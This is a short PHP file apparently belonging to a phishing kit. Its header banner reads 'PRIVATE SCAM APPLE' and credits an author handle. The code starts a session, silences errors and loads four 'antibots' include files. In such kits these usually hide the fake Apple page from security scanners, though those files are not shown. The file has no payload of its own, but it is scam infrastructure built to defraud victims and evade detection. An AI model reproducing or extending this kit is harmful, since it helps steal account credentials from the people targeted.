<?php
/*   
                              #===============================#
                              #    PRIVATE SCAM APPLE         #
                              #           PIradz17            #
							  #     Facebook.com/Piradz17     #
                              #===============================#                     
*/

session_start();
error_reporting(0);
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "./antibots1.php";
include "./antibots2.php";
include "./antibots3.php";
include "./antibots4.php";
//----------------------------------------------------------------------------------------------------------------//

?>
